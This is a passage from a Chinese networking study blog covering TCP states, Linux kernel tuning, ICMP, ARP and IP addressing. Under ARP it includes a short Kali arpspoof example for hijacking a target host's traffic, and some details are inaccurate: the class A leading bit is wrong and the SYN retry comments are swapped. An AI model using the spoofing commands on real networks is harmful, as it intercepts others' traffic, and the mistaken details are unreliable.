ack			<span class="token comment"># 确认对方位置，并希望对方下次从这个位置开始发送信息</span></code></pre>

<ol>
<li><p>第一次握手：主动方 —&gt; 被动方：<code>seq=0，next seq=1，ack=0</code><br><font color=red>我在 0（seq&#x3D;0），你收到这条消息我就去 1（next seq&#x3D;1），你在 0 吗（ack&#x3D;0）</font></p>
</li>
<li><p>第二次握手：被动方 —&gt; 主动方：<code>seq=0，next seq=1，ack=1</code><br><font color=red>我在 0（seq&#x3D;0），你收到这条消息我就去 1（next seq&#x3D;1），你在 1 吗（ack&#x3D;1）</font></p>
</li>
<li><p>第三次握手：主动方 —&gt; 被动方：<code>seq=1，next seq=1，ack=1</code><br><font color=red>我在 1（seq&#x3D;1），你收到这条消息我还在 1（next seq&#x3D;1），你在 1 吗（ack&#x3D;1）</font></p>
</li>
<li><p>服务端收到了，默默去了 1</p>
</li>
<li><p>之后进行数据传送</p>
</li>
</ol>
<p>前 3 条报文互相没有发送任何数据，只是相互通知自己要去 1，同时确认对方也到 1</p>
<h4 id="sync-半连接和-accept-全连接队列"><a href="#sync-半连接和-accept-全连接队列" class="headerlink" title="sync 半连接和 accept 全连接队列"></a>sync 半连接和 accept 全连接队列</h4><ul>
<li><p>syns queue：第一次握手后，被动方把请求放到 syns queue（半连接队列、未完成连接队列），然后进入 SYN-RCVD 状态</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_max_syn_backlog   <span class="token comment">#半连接队列大小，默认值128,建议调整大小为1024以上</span></code></pre>
</li>
<li><p>accept queue：最后一次握手后，从 syns queue 中拿出相关信息放到 accept queue(全连接队列、完成连接队列)，然后进入 ESTAB 状态</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/core/somaxconn    <span class="token comment">#全连接队列大小，默认值128,建议调整大小为1024以上</span></code></pre></li>
</ul>
<h4 id="三次握手过程中-TCP-状态"><a href="#三次握手过程中-TCP-状态" class="headerlink" title="三次握手过程中 TCP 状态"></a>三次握手过程中 TCP 状态</h4><p><strong>主动方：</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">CLOSED			<span class="token comment"># 三次握手之前的状态</span>
SYN-SENT		<span class="token comment"># 发送SYN=1的请求建立连接的报文后的状态</span>
ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></code></pre>

<p><strong>被动方：</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">CLOSED			<span class="token comment"># 服务器还没有建立监听状态，此时无法处理客户端发送的请求，也就是无法进行三次握手</span>
LISTEN			<span class="token comment"># 建立监听状态，例如启动nginx后，才会监听80端口，此时才能处理http请求</span>
SYN-RCVD		<span class="token comment"># 第二次握手和第三次握手的间隙</span>
ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></code></pre>

<h3 id="TCP-四次挥手"><a href="#TCP-四次挥手" class="headerlink" title="TCP 四次挥手"></a>TCP 四次挥手</h3><p>以下 主动方 是主动挥手方，被动方 是 被动挥手方</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1613529829069.png"></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598322188545.png"></p>
<ol>
<li>主动方 —&gt; 被动方：ACK&#x3D;1，FIN&#x3D;1<br>FIN&#x3D;1 告诉服务器我要断开连接</li>
<li>被动方 —&gt; 主动方：ACK&#x3D;1<br>收到消息，你稍等，我看看还有没有数据再给你</li>
<li>被动方 —&gt; 主动方：ACK&#x3D;1，FIN&#x3D;1，PSH&#x3D;1<br>可能携带数据，也可能不携带，总之，你一次性取出来吧。这次你断开吧</li>
<li>主动方 —&gt; 服务器：ACK&#x3D;1<br>OK，我断开了，拜拜</li>
</ol>
<p>注意：非正常的断开连接是不会有完整的四次挥手的</p>
<p>四次挥手中 seq 和 ack 是如何变化的：相互通知对方自己的位置相较正常发送数据的情况下往前多走 1 位，并确认对方的位置</p>
<h4 id="四次挥手过程中-TCP-状态"><a href="#四次挥手过程中-TCP-状态" class="headerlink" title="四次挥手过程中 TCP 状态"></a>四次挥手过程中 TCP 状态</h4><p><strong>主动方：</strong></p>
<ul>
<li><p>ESTAB-LISTEN：双方连接正常，也可以只显示 ESTAB</p>
</li>
<li><p>FIN-WAIT-1：主动方发送 FIN&#x3D;1 请求断开连接请求，到被动方回复 ACK&#x3D;1，确认收到请求的这段时间</p>
</li>
<li><p>FIN-WAIT-2：确认被动方收到分手请求，到被动方发送最后一次数据的这段等待时间。处于 FIN_WAIT_2 状态的主动方需要等待被动方发送结束报文段，才能转移至 TIME_WAIT 状态，否则它将一直停留在这个状态。连接长时间地停留在 FIN_WAIT_2，可能会未等服务器关闭连接就强行退出了，此时客户端连接由内核来接管，可称之为孤儿连接（和孤儿进程类似）。<br>Linux 为了防止孤儿连接长时间存留在内核中，定义了两个内核参数：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_max_orphans <span class="token comment">#指定内核能接管的孤儿连接数目</span>
/proc/sys/net/ipv4/tcp_fin_timeout <span class="token comment">#指定孤儿连接在内核中生存的时间</span></code></pre>
</li>
<li><p>TIME-WAIT：主动方发送完最后一次挥手后，保持这个状态，确保 tcp 连接不断开，时间是 2MSL，确保被动方第三次挥手发送失败可以重发。</p>
<ul>
<li>每个报文段的生命周期是 1 个 MSL，一般是 30 秒</li>
<li>只有主动方等待 2 个单位的 MSL，才能确保可以收到被动方的重传 FIN 报文</li>
</ul>
</li>
<li><p>CLOSED：彻底断开连接，可以重新建立连接了</p>
</li>
</ul>
<p>以上是理想情况，实际上主动方先发送一个 FIN 给被动方，自己进入 FIN_WAIT_1 状态，这时等待接收被动方报文，该报文会有三种可能：</p>
<ul>
<li><p>ACK：只收到被动方的 ACK，主动方会进入 FIN_WAIT_2 状态</p>
</li>
<li><p>FIN：只有被动方的 FIN 时，回应一个 ACK 给被动方，进入 CLOSING 状态，然后接收到被动方的 ACK 时，进入 TIME_WAIT 状态</p>
</li>
<li><p>ACK、FIN：同时收到被动方的 ACK 和 FIN，直接进入 TIME_WAIT 状态</p>
</li>
</ul>
<p><strong>被动方：</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ESTAB-LISTEN	<span class="token comment"># 双方连接正常，也可以只显示ESTAB</span>
CLOSE-WAIT		<span class="token comment"># 确认收到挥手请求，到发送最后一次数据传输中间的状态，即第二、三次挥手的中间状态</span>
LAST-ACK		<span class="token comment"># 发送完最后一次数据传输，等待主动方最后的挥手，即第三、四次挥手的中间状态</span>
CLOSED			<span class="token comment"># 彻底断开连接，可以重新建立连接了</span></code></pre>

<h3 id="tcp-状态以及状态转换"><a href="#tcp-状态以及状态转换" class="headerlink" title="tcp 状态以及状态转换"></a>tcp 状态以及状态转换</h3><ol>
<li>CLOSED：没有任何连接状态</li>
<li>LISTEN：侦听状态，等待来自远方 TCP 端口的连接请求</li>
<li>SYN-SENT：在发送连接请求后，等待对方确认</li>
<li>SYN-RECEIVED：SYN-RCVD，在收到和发送一个连接请求后，等待对方确认</li>
<li>ESTABLISHED：代表传输连接建立，双方进入数据传送状态</li>
<li>FIN-WAIT-1：主动关闭，主机已发送关闭连接请求，等待对方确认</li>
<li>FIN-WAIT-2：主动关闭,主机已收到对方关闭传输连接确认，等待对方发送关闭传输连接请求</li>
<li>TIME-WAIT：完成双向传输连接关闭，等待所有分组消失</li>
<li>CLOSE-WAIT：被动关闭,收到对方发来的关闭连接请求，并已确认</li>
<li>LAST-ACK：被动关闭,等待最后一个关闭传输连接确认，并等待所有分组消失</li>
<li>CLOSING：双方同时尝试关闭传输连接，等待对方确认</li>
</ol>
<h3 id="tcp-超时重传"><a href="#tcp-超时重传" class="headerlink" title="tcp 超时重传"></a>tcp 超时重传</h3><pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_retries1 <span class="token comment">#指定在底层IP接管之前TCP最少执行的重传次数，默认值是3</span>
/proc/sys/net/ipv4/tcp_retries2 <span class="token comment">#指定连接放弃前TCP最多可以执行的重传次数，默认值15（一般对应13～30min）</span></code></pre>

<h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>当前所使用的拥塞控制算法</p>
<pre class="language-none"><code class="language-none">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_congestion_control</code></pre>

<h3 id="tcp-内核参数优化"><a href="#tcp-内核参数优化" class="headerlink" title="tcp 内核参数优化"></a>tcp 内核参数优化</h3><p>编辑文件&#x2F;etc&#x2F;sysctl.conf，加入以下内容：然后执行 sysctl -p 让参数生效。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 套接字由本端要求关闭，规定保持在FIN-WAIT-2状态的时间，默认值是60秒</span>
net.ipv4.tcp_fin_timeout <span class="token operator">=</span> <span class="token number">2</span>

<span class="token comment"># 提示：reuse和recycle这两个参数可以防止生产环境下Web、Squid等业务服务器time_wait网络状态数量过多</span>
<span class="token comment"># 开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认0</span>
net.ipv4.tcp_tw_reuse <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment"># 开启TCP连接中TIME-WAIT sockets的快速回收，默认0</span>
net.ipv4.tcp_tw_recycle <span class="token operator">=</span> <span class="token number">1</span>

<span class="token comment"># 开启SYN Cookies功能。当出现SYN等待队列溢出时，启用Cookies来处理，可防范少量SYN攻击</span>
net.ipv4.tcp_syncookies <span class="token operator">=</span> <span class="token number">1</span>

<span class="token comment"># 当keepalive启用时，TCP发送keepalive消息的频率。单位秒</span>
net.ipv4.tcp_keepalive_time <span class="token operator">=</span> <span class="token number">600</span>

<span class="token comment"># 设定允许系统打开的端口范围，即用于向外连接的端口范围</span>
net.ipv4.ip_local_port_range <span class="token operator">=</span> <span class="token number">2000</span> <span class="token number">65000</span>

<span class="token comment"># SYN队列的长度，即半连接队列长度，默认为1024，建议加大队列的长度为8192或更多，这样可以容纳更多等待连接的网络连接数。 该参数为服务器端用于记录那些尚未收到客户端确认信息的连接请求最大值</span>
net.ipv4.tcp_max_syn_backlog <span class="token operator">=</span> <span class="token number">16384</span>

<span class="token comment"># 系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数值，TIME_WAIT套接字将立刻被清除并打印警告信息。 默认为180000，对于Apache、Nginx等服务器来说可以将其调低一点，如改为5000~30000，避免因过多的TIME_WAIT套接字使Web服务器变慢</span>
net.ipv4.tcp_max_tw_buckets <span class="token operator">=</span> <span class="token number">36000</span>

<span class="token comment"># 路由缓存刷新频率，当一个路由失败后多长时间跳到另一个路由，默认是300</span>
net.ipv4.route.gc_timeout <span class="token operator">=</span> <span class="token number">100</span>

<span class="token comment"># 内核放弃连接之前发送SYN+ACK包的数量，默认5</span>
net.ipv4.tcp_syn_retries <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment"># 在内核放弃建立连接之前发送SYN包的数量，默认6</span>
net.ipv4.tcp_synack_retries <span class="token operator">=</span> <span class="token number">1</span>

<span class="token comment"># 系统所能处理不属于任何进程的TCP sockets最大数量（主动关闭端发送了FIN后转到FIN_WAIT_1，这时TCP连接就不属于某个进程了）。假如超过这个数量，那么不属于任何进程的连接会被立即reset，并同时显示警告信息。之所以要设定这个限制，纯粹为了抵御那些简单的 DoS 攻击﹐千万不要依赖这个或是人为的降低这个限制，默认8192</span>
net.ipv4.tcp_max_orphans <span class="token operator">=</span> <span class="token number">16384</span>

<span class="token comment"># 同时发起的TCP的最大连接数，即全连接队列长度，在高并发请求中，可能会导致链接超时或重传，一般结合并发请求数来调大此值，默认128</span>
net.core.somaxconn <span class="token operator">=</span> <span class="token number">16384</span>

<span class="token comment"># 当每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许发送到队列的数据包最大数，默认1000</span>
net.core.netdev_max_backlog <span class="token operator">=</span> <span class="token number">16384</span></code></pre>

<p>以上参数在 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4 路径下</p>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>udp 包头结构</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598341151668.png"></p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jingmoxukong/p/3811262.html">ICMP</a></h3><p>ICMP 报文在 IP 报文内部：</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1600676241594.png"></p>
<p><strong>icmp 包头结构：</strong></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1600938679478.png"><br><img data-src="//img.to2b.cn/blog/ljk/1600938925363.png"></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1613533292143.png"></p>
<ul>
<li>类型：一个 8 位类型字段，表示 ICMP 数据包类型</li>
<li>代码：一个 8 位代码域，表示指定类型中的一个功能。如果一个类型中只有一种功能，代码域置为 0</li>
<li>校验和：校验整个 ICMP 报文段，提供额外的可靠性</li>
</ul>
<p>ICMP 协议是为了辅助 IP 协议而被制造出来，ICMP 分担完善了 IP 的一部分功能。<br>ICMP 的功能分为两类：<strong>差错通知</strong> 和 <strong>信息查询</strong>，具体由 8 位的类型字段决定，以下是具体各种功能：</p>
<h4 id="目的不可达（Destination-Unreachable）"><a href="#目的不可达（Destination-Unreachable）" class="headerlink" title="目的不可达（Destination Unreachable）"></a>目的不可达（Destination Unreachable）</h4><p>type：destination-unreachable，3</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">code：0 - <span class="token number">15</span>

<span class="token comment"># 0：目标网络不可达</span>
<span class="token comment"># 1：目标主机不可达</span>
<span class="token comment"># 2：目标协议不可达</span>
<span class="token comment"># 3：目标端口不可达</span>
<span class="token comment"># ...</span></code></pre>

<h4 id="超时（Time-Exceeded）"><a href="#超时（Time-Exceeded）" class="headerlink" title="超时（Time Exceeded）"></a>超时（Time Exceeded）</h4><p>type：time-exceeded，11</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">code：0、1

<span class="token comment"># 0：在数据报传输期间生存时间TTL为0；传输过程中超时</span>
<span class="token comment"># 1：在数据报组装期间生存时间TTL为0；一个IP数据报可能会因为过大而被分片，然后在目的主机侧把所有的分片重组。如果主机迟迟没有等到所有的分片报文，就会向源发送方发送一个ICMP超时报文，Code为1，表示分片重组超时了</span></code></pre>

<h4 id="参数错误报文（Parameter-Problem）"><a href="#参数错误报文（Parameter-Problem）" class="headerlink" title="参数错误报文（Parameter Problem）"></a>参数错误报文（Parameter Problem）</h4><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
<p>| Type | Code | Checksum |</p>
<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
<p>| Pointer | unused |</p>
<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
<p>| Internet Header + 64 bits of Original Data Datagram |</p>
<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
<p>type：parameter-problem，12</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">code：0、1

<span class="token comment"># 0：IP数据报头的参数错误，Pointer表示错误的字节位置</span>
<span class="token comment"># 1：缺少必需的选项</span></code></pre>

<h4 id="源冷却（Source-Quench）"><a href="#源冷却（Source-Quench）" class="headerlink" title="源冷却（Source Quench）"></a>源冷却（Source Quench）</h4><p>type：source-quench，4</p>
<p>code：0，路由器在处理报文时会有一个缓存队列。如果超过最大缓存队列，将无法处理，从而丢弃报文。并向源发送方发一个 ICMP 源冷却报文，告诉对方：“嘿，我这里客满了，你迟点再来。”</p>
<h4 id="重定向（Redirect）"><a href="#重定向（Redirect）" class="headerlink" title="重定向（Redirect）"></a>重定向（Redirect）</h4><p>type：redirect，5</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">code：0 - <span class="token number">3</span>

<span class="token comment"># 0：网络重定向</span>
<span class="token comment"># 1：主机重定向</span>
<span class="token comment"># 2：服务类型和网络重定向</span>
<span class="token comment"># 3：服务类型和主机重定向</span></code></pre>

<h4 id="请求回显或回显应答（Echo-or-Echo-Reply）"><a href="#请求回显或回显应答（Echo-or-Echo-Reply）" class="headerlink" title="请求回显或回显应答（Echo or Echo Reply）"></a>请求回显或回显应答（Echo or Echo Reply）</h4><p>type：echo-request，8，请求回显，ping 请求；</p>
<pre><code>code：0，因为只有这一个功能，所以code只为0
</code></pre>
<p>type：echo-reply，0，回显应答，ping 应答；</p>
<pre><code>code：0，因为只有这一个功能，所以code只为0
</code></pre>
<h4 id="时间戳或时间戳请求（Timestamp-or-Timestamp-Reply）"><a href="#时间戳或时间戳请求（Timestamp-or-Timestamp-Reply）" class="headerlink" title="时间戳或时间戳请求（Timestamp or Timestamp Reply）"></a>时间戳或时间戳请求（Timestamp or Timestamp Reply）</h4><h4 id="信息请求或信息响应（Info-Request-or-Info-Reply）"><a href="#信息请求或信息响应（Info-Request-or-Info-Reply）" class="headerlink" title="信息请求或信息响应（Info Request or Info Reply）"></a>信息请求或信息响应（Info Request or Info Reply）</h4><h4 id="地址掩码请求-和-地址掩码响应（Address-Mask-Request-or-Address-Mask-Reply）"><a href="#地址掩码请求-和-地址掩码响应（Address-Mask-Request-or-Address-Mask-Reply）" class="headerlink" title="地址掩码请求 和 地址掩码响应（Address Mask Request or Address Mask Reply）"></a>地址掩码请求 和 地址掩码响应（Address Mask Request or Address Mask Reply）</h4><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>ARP（Address Resolution Protocol）即地址解析协议， 用于实现从 IP 地址到 MAC 地址的映射，即询问目标 IP 对应的 MAC 地址。</p>
<p>ARP 的工作过程：</p>
<p>通过广播可以获取目标 ip 的 MAC 地址，拿到地址后，源主机和目标主机会缓存对方的 ip 和 MAC 地址。</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598355062997.png"></p>
<p>显然这种方式是不安全的，例如 pc1 想上网，上网得通过路由器，那就得拿到路由器的 MAC 地址，于是 pc1 就发送广播请求路由器的 MAC 地址，同一个局域网下 pc2 冒充路由器把自己的 MAC 地址回复给 pc1，如果 pc1 不做校验就信以为真，那之后 pc1 所有的网路请求都找 pc2，pc2 帮它转发到真正的路由器。</p>
<p>范例：kali 系统实现 arp 欺骗上网流量劫持</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#启动路由转发功能</span>
<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># echo 1 > /proc/sys/net/ipv4/ip_forward</span>
<span class="token comment">#安装包</span>
<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># apt-get install dsniff</span>
<span class="token comment">#欺骗目标主机，本机是网关</span>
<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># arpspoof -i eth0 -t 被劫持的目标主机IP 网关IP</span>
<span class="token comment">#欺骗网关，本机是目标主机</span>
<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># arpspoof -i eth0 -t 网关IP 被劫持的目标主机IP</span></code></pre>

<h4 id="Gratuitous-ARP"><a href="#Gratuitous-ARP" class="headerlink" title="Gratuitous ARP"></a>Gratuitous ARP</h4><p>Gratuitous ARP 也称为免费 ARP，无故 ARP。Gratuitous ARP 不同于一般的 ARP 请求，它并非期待得到 ip 对应的 mac 地址，而是当主机启动的时候，将发送一个 Gratuitous arp 请求，即请求自己的 ip 地址的 mac 地址。具体表现形式为自问自答。Wireshark 监听 vmware 虚拟机启动可以抓到相应的包。</p>
<h3 id="RARP"><a href="#RARP" class="headerlink" title="RARP"></a>RARP</h3><p>ARP 是将 ip 转成 MAC，RARP 是将 MAC 转成 ip。在网吧中会用到，网吧中的电脑是没有硬盘的，操作系统、软件、数据等都放在服务器中，每次开机都先通过网卡把初始化的操作系统下载下来放到内存中，再从内存中加载。加载的过程中使用 RARP 获取 ip，过程如下：</p>
<ol>
<li>pc 将自己的 mac 发给服务器</li>
<li>服务器中预设了 arp 表，查询表，将对应的 ip 发给 pc</li>
</ol>
<h3 id="IP-包头"><a href="#IP-包头" class="headerlink" title="IP 包头"></a>IP 包头</h3><img data-src="//img.to2b.cn/blog/ljk/1598357957585.png" style="zoom:80%;" />

<p><img data-src="//img.to2b.cn/blog/ljk/1598361685849.png"></p>
<ul>
<li>版本：目前主流是 4 版本</li>
<li>首部长度：固定的 20 个字节+可选字段的长度</li>
<li>区分服务：服务类型，ToS，Type of Service，只有当网络设备能够识别 ToS 时，ToS 字段才有意义，我的笔记本上 Wireshark 抓包就没有这个字段</li>
<li>总长度：总长度，包括数据部分</li>
<li>标识：数据比较大，传输层会分段后再发给网络层，分段后的数据标识都是一样的。同时还是计数器，每发送一个报文，该值+1</li>
<li>标志：占 3 位,目前只有后两位有意义<ul>
<li>DF： Don’t Fragment 中间的一位，只有当 DF&#x3D;0 时才允许分片</li>
<li>MF： More Fragment 最后一位，MF&#x3D;1 表示后面还有分片,MF&#x3D;0 表示最后一个分片 IP PDU 报头</li>
</ul>
</li>
<li>片漂移：该分片在原分组中的相对位置.片偏移以 8 个字节为偏移单位</li>
<li>生存时间：记为 TTL (Time To Live) 报文在网络中可通过的路由器数的最大值，TTL 字段是由发送端初始设置一个 8 bit 字段。Linux 默认 64，windows 默认 128<ul>
<li>在<code>/proc/sys/net/ipv4/ip_default_ttl </code>中可以改</li>
</ul>
</li>
<li>协议：指定上层协议的类型，1 表示为 ICMP 协议, 2 表示为 IGMP 协议, 6 表示为 TCP 协议, 17 表示为 UDP 协议</li>
<li>首部校验和：tcp 的包头也有这个校验，这是有点重复，所以在 ipv6 中就没有这个字段了</li>
<li>源地址和目的地址：都各占 4 字节,分别记录源地址和目的逻辑地址，也就是 ip 地址</li>
</ul>
<h2 id="主机到主机的包传递完整过程"><a href="#主机到主机的包传递完整过程" class="headerlink" title="主机到主机的包传递完整过程"></a>主机到主机的包传递完整过程</h2><p>第 12 天第五节课</p>
<p>四步走：路由（下面讲）、arp、三次握手、数据传输</p>
<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>ip 地址是逻辑地址，MAC 地址是物理地址。物理地址唯一但不好管理，逻辑地址唯一且好管理。</p>
<h3 id="IP-地址组成"><a href="#IP-地址组成" class="headerlink" title="IP 地址组成"></a>IP 地址组成</h3><p>两部分组成：网络 ID 和 主机 ID</p>
<p>类似 10.0.0.1 这种用点分割成 4 段的是 ipv4 的 ip，可以用一个 32 位二进制的数来表示，每段对应 8 位。</p>
<h3 id="IP-地址分类"><a href="#IP-地址分类" class="headerlink" title="IP 地址分类"></a>IP 地址分类</h3><p>五类，A 类、B 类、C 类、D 类、E 类。E 类保留，D 类不能配置，所以我们能配置的是 A、B、C 三类。</p>
<ul>
<li>A 类：网络 ID 位是最高 8 位，主机 ID 是 24 位低位。规定最高位是 1，所以 A 类只剩下 2^7（128）个网段（网络），也就是 0-127，但是 0 保留不能用，表示未知地址，127 用于回环网卡，所以 ipv4 中处于 A 类网络的一共有 126 个网段，<strong>1.x.x.x-126.x.x.x</strong>。所以 10.x.x.x、126.x.x.x 这种一看就是 A 类，而 172.x.x.x 这种大于 126，一看就不是 A 类网络</li>
<li>B 类：网络 ID 位是最高 16 位,主机 ID 是 16 位低位。规定最高两位是 10，所有 B 类网络有 2^14 个网段，<strong>128.0.x.x-191.255.x.x</strong>。</li>
<li>C 类：网络 ID 位是最高 24 位,主机 ID 是 8 位低位。规定前三位是 110，所以 C 类网络中有 2^21 个网段，<strong>192.0.0.x-223.255.255.x</strong>。</li>
<li>D 类：组播、多播。224-239</li>
<li>E 类：保留未使用，240-255</li>
</ul>
<p>这么分类简单粗暴，缺点也很明显，容易浪费，现在 ipv4 地址已经消耗殆尽了。</p>
<p>分配 ipv4 的权利在美国手里，早期甚至直接给一个大学分配一个网段，这个网段的地址其他人就申请不到了，其实根本用不了，用不了的就浪费掉了。</p>
<h4 id="无类"><a href="#无类" class="headerlink" title="无类"></a>无类</h4><p>就是不按照 ABCD 的方式划分，网络 ID 想划几位就几位，按需划分，不固定非得是 8 位、16 位、24 位等等</p>
<h3 id="公有和私有-IP-地址"><a href="#公有和私有-IP-地址" class="headerlink" title="公有和私有 IP 地址"></a>公有和私有 IP 地址</h3><p>公共 IP 地址：互联网上设备拥有的唯一地址。</p>
<p>私有 IP 地址：不直接用于互联网，通常在局域网中使用。</p>
<img data-src="//img.to2b.cn/blog/ljk/1598365287677.png" style="zoom: 68%;" />

<img data-src="//img.to2b.cn/blog/ljk/1598365326536.png" style="zoom: 63%;" />

<h3 id="特殊地址"><a href="#特殊地址" class="headerlink" title="特殊地址"></a>特殊地址</h3><ul>
<li><p>0.0.0.0：不是一个真正意义上的 IP 地址。它表示 <strong>所有不清楚的主机和目的网络</strong></p>
</li>
<li><p>255.255.255.255：限制广播地址，对本机来说，这个地址指本网段内(同一广播域)的所有主机</p>
</li>
<li><p>127.0.0.1 ～ 127.255.255.254</p>
<p>本机回环地址，主要用于测试。在传输介质上永远不应该出现目的地址为“127.0.0.1”的 数据包</p>
</li>
<li><p>224.0.0.0 到 239.255.255.255</p>
<p>组播地址，224.0.0.1 特指所有主机，224.0.0.2 特指所有路由器。224.0.0.5 指 OSPF 路由器，地址多用于一些特定的程序以及多媒体程序</p>
<p>前 4 比特固定为 1110，后 28 比特是组播组地址标识(ID)</p>
<p>如果想接收组播，主机必须加入到对应的组播组中，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP/214077">TCP&#x2F;IP</a>的套接字(socket) API 提供了相应的方法。当一台主机加入一个组播组后，它既有一个本机的 IP 地址，同时也有一个组播组的 D 类 IP 地址，对于目的地址是这两个地址的 IP 数据报，这台主机都会接收。</p>
<p>一台主机可以随时加入或离开一个组播组，也可以同时属于多个组播组。一台主机可以向任何一个组播组发送 IP 组播数据报，即使这台主机不是这个组播组的成员。</p>
<p>由于 D 类 IP 地址有 268*435*456 个，因此 IP 协议允许有 2 亿 6 干多万个组播，可以提供非常丰富的组播服务</p>
</li>
<li><p>169.254.x.x</p>
<p>如果 Windows 主机使用了 DHCP 自动分配 IP 地址，而又无法从 DHCP 服务器获取地址，系统会为主机分配这样地址</p>
</li>
</ul>
<h3 id="保留地址"><a href="#保留地址" class="headerlink" title="保留地址"></a>保留地址</h3><p>用 32 位二进制表示的 ip，主机 ID 位全是 0 和全是 1 的情况，保留。例如 172.16.0.0 网段中，172.16.0.0 和 172.16.255.255 是保留地址。</p>
<h3 id="子网掩码-netmask"><a href="#子网掩码-netmask" class="headerlink" title="子网掩码 netmask"></a>子网掩码 netmask</h3><p>CIDR：无类域间路由，目前的路由已不再按 A、B、C 类划分网段，而是可以指定网段的范围。</p>
<p>CIDR 表示法：IP&#x2F;网络 ID 位数，例如：172.16.0.100&#x2F;16</p>
<p>netmask 子网掩码：32 位或 128 位（IPv6）的二进制数字，和 IP 成对使用，用来表示前几位是网络 ID，网络 ID 位全是 1，主机位全是 0。例如 255.255.255.0，前 24 位是网络 ID。</p>
<img data-src="//img.to2b.cn/blog/ljk/1616987648967.png" style="zoom:80%;" />

<h4 id="判断对方主机是否在同一网段："><a href="#判断对方主机是否在同一网段：" class="headerlink" title="判断对方主机是否在同一网段："></a>判断对方主机是否在同一网段：</h4><p>用自已的子网掩码分别和自已的 IP 及对方的 IP 相与，比较结果，相同则同一网段，不同则不同网段。不同的网段是不能通信的。</p>
<h3 id="划分子网-Subnet"><a href="#划分子网-Subnet" class="headerlink" title="划分子网 Subnet"></a>划分子网 Subnet</h3><p>划分子网：将一个大的网络（主机数多）划分成多个小的网络（主机数少），网络 ID 位向主机 ID 位借位，主机 ID 位数变少，网络 ID 位数变多。</p>
<h3 id="优化-IP-地址分配"><a href="#优化-IP-地址分配" class="headerlink" title="优化 IP 地址分配"></a>优化 IP 地址分配</h3><p>合并超网：将多个小网络合并成一个大网，主机 ID 位向网络位借位。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 8个C类网段</span>
<span class="token number">220.78</span>.168.0/24
<span class="token number">220.78</span>.169.0/24
<span class="token number">220.78</span>.170.0/24
<span class="token number">220.78</span>.171.0/24
<span class="token number">220.78</span>.172.0/24
<span class="token number">220.78</span>.173.0/24
<span class="token number">220.78</span>.174.0/24
<span class="token number">220.78</span>.175.0/24
<span class="token number">220.78</span>.10101 000.0  <span class="token number">220.78</span>.168.0/24
<span class="token number">220.78</span>.10101 001.0  <span class="token number">220.78</span>.169.0/24
<span class="token number">220.78</span>.10101 010.0  <span class="token number">220.78</span>.170.0/24
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">220.78</span>.10101 <span class="token number">110.0</span>  <span class="token number">220.78</span>.174.0/24
<span class="token number">220.78</span>.10101 <span class="token number">111.0</span>  <span class="token number">220.78</span>.175.0/24

<span class="token comment"># 合并成</span>
<span class="token number">220.78</span>.168.0/21</code></pre>

<h3 id="跨网络通信"><a href="#跨网络通信" class="headerlink" title="跨网络通信"></a>跨网络通信</h3><p>跨网络通信：路由、选择路径</p>
<p>路由分类：主机路由、网络路由、默认路由</p>
<h3 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议 DHCP"></a>动态主机配置协议 DHCP</h3><img data-src="//img.to2b.cn/blog/ljk/1598406043275.png" style="zoom:50%;" />

